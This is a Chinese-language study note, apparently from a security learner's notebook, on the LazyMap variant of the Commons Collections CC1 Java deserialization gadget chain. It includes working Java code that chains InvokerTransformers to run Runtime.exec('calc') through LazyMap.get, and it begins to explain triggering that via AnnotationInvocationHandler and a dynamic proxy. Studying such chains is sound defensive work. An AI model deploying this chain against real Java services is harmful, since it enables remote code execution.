## ChainedTransformer实现rce
前面还是一样的通过`ChainedTransformer的transform`方法递归调用`InvokerTransformer的transform`方法从而实现命令执行。

那么我们现在的目标就是找到一个可以调用`ChainedTransformer的transform`方法的地方，这里我们找的是`LazyMap中的get`方法，而CC1中选择的是`TransformedMap中的checkSetvalue`
![](assets/CC1%20国外/file-20251204161845259.png)
## LazyMap实现transform
我们只需要给`factory`参数赋值为`ChainedTransformer`就好了。注意这里需要绕过一个if判断，我们传一个空的Object对象就好。
```java
Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null, null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        HashMap<Object,Object> map = new HashMap();  
  
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);  
        lazymap.get(new Object());
```
这里就通过我们手动调用`get`方法实现了rce。（因为构造方法是protect的所以要通过decorate方法构造对象）。

## 

然后我们要去看谁能调用get方法，这里太多了，必须对开发很理解了。只能记住了。
找到的是`AnnotationInvocationHandler` 。
 ![](assets/CC1%20国外/file-20251204164006845.png)
 找了一下又几个地方都调用了get方法，但是能控制对象的只有这里。所以我们只要构造`memberValues`为`LazyMap`就好了，但是我们还需要想一想怎么样才能调用这个get方法。注意到，这里是再这个类的`Invoke`方法里面，而当我们使用动态代理时，只要被代理类调用了任意方法，都会调用代理类的`Invoke`方法。